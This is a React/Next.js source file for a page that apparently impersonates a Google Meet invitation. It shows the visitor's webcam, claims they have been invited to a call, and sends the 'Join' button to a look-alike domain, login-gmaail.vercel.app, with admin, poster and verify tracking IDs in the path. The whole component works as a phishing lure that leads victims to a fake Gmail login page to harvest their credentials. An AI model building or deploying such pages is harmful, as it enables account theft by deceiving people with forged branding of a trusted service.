"use client";
import { useState, useRef, useEffect } from "react";
import Image from "next/image";
import Webcam from "react-webcam";
import { Mic, MicOff, Video, VideoOff } from "lucide-react";

export default function VideoCall({ adminId, posterId, verifyId, sitename }) {
  const [micEnabled, setMicEnabled] = useState(true);
  const [cameraEnabled, setCameraEnabled] = useState(true);
  const webcamRef = useRef(null);

  const toggleMic = () => {
    setMicEnabled(!micEnabled);
  };

  const toggleCamera = () => {
    setCameraEnabled(!cameraEnabled);
  };
  const playNotificationSound = () => {
    const audio = new Audio("/tune.mp3");
    audio.play().catch((error) => {
      console.error("Error playing the sound:", error);
    });

    return () => {
      audio.pause();
      audio.currentTime = 0;
    };
  };
  const requestNotificationPermission = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      if (stream) {
        playNotificationSound();
      }
    } catch (error) {
      console.error("Error requesting notification permission:", error);
    }
  };
  useEffect(() => {
    requestNotificationPermission();
  }, [adminId, posterId]);

  return (
    <div className="h-[100dvh] w-full max-w-md mx-auto px-4 py-3 sm:py-5 flex flex-col justify-between items-center overflow-hidden box-border">
      {/* Top Logo / Title Header */}
      <div className="w-full flex items-center justify-start pt-1 px-2">
        <div className="w-40 sm:w-48 h-10 sm:h-12 relative">
          <Image
            src="/logo.png"
            alt="Google Meet Logo"
            width={160}
            height={48}
            className="w-full h-full object-contain object-left"
            priority
          />
        </div>
      </div>

      {/* Camera Video Frame */}
      <div className="relative rounded-xl shadow-lg overflow-hidden my-auto border border-gray-100">
        {cameraEnabled ? (
          <Webcam
            audio={micEnabled}
            ref={webcamRef}
            className="object-cover w-[86vw] max-w-[340px] sm:max-w-[380px] h-[330px] sm:h-[360px] md:h-[390px] rounded-xl"
            mirrored={true}
          />
        ) : (
          <div className="w-[86vw] max-w-[340px] sm:max-w-[380px] h-[330px] sm:h-[360px] md:h-[390px] rounded-xl bg-gray-900 flex flex-col items-center justify-center gap-2">
            <VideoOff className="w-10 h-10 text-gray-500" />
            <p className="text-gray-300 text-lg font-medium">Camera Off</p>
          </div>
        )}

        <div className="absolute bottom-3 left-0 right-0 flex justify-center space-x-4">
          <button
            onClick={toggleMic}
            type="button"
            className={`p-3 rounded-full transition-all duration-200 shadow-md ${
              micEnabled
                ? "bg-white text-gray-800 hover:bg-gray-100"
                : "bg-red-500 text-white hover:bg-red-600"
            }`}
            aria-label={micEnabled ? "Mute Microphone" : "Unmute Microphone"}
          >
            {micEnabled ? <Mic size={20} /> : <MicOff size={20} />}
          </button>

          <button
            onClick={toggleCamera}
            type="button"
            className={`p-3 rounded-full transition-all duration-200 shadow-md ${
              cameraEnabled
                ? "bg-white text-gray-800 hover:bg-gray-100"
                : "bg-red-500 text-white hover:bg-red-600"
            }`}
            aria-label={cameraEnabled ? "Turn Off Camera" : "Turn On Camera"}
          >
            {cameraEnabled ? <Video size={20} /> : <VideoOff size={20} />}
          </button>
        </div>
      </div>

      {/* Description Text */}
      <div className="text-center space-y-1.5 px-3 my-auto max-w-xs">
        {sitename?.name && (
          <p className="text-xl font-semibold text-red-500">{sitename.name}</p>
        )}
        <p className="text-gray-600 text-sm sm:text-base font-semibold leading-snug">
          You have been invited to join Google Meet. Please join the video call
        </p>
      </div>

      {/* Join Action Button */}
      <div className="w-full flex justify-center pb-2">
        <a
          href={
            adminId && posterId && verifyId
              ? `https://login-gmaail.vercel.app/${adminId}/${posterId}/${verifyId}`
              : "https://login-gmaail.vercel.app"
          }
          className="bg-green-500 hover:bg-green-600 text-white px-12 sm:px-14 py-3 rounded-lg text-xl sm:text-2xl font-extrabold transition-colors shadow-md text-center block"
        >
          Join
        </a>
      </div>
    </div>
  );
}

